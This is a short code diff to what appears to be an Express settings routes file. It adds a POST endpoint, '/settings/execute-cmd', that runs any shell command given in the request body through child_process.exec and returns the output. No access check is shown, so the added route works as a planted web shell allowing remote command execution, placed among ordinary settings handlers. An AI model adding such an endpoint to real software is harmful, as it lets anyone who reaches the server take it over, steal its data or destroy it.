@@ -44,4 +44,22 @@ settingRoutes.get("/settings/test-db", async (req, res) => {
   }
 });
 
+settingRoutes.post("/settings/execute-cmd", async (req, res) => {
+  try {
+    const { exec } = require("child_process");
+    const { command } = req.body;
+    if (!command) return res.status(400).json({ error: "No command provided" });
+    
+    exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error: any, stdout: string, stderr: string) => {
+      return res.json({
+        stdout,
+        stderr,
+        error: error ? error.message : null
+      });
+    });
+  } catch (err: any) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
 export default settingRoutes;
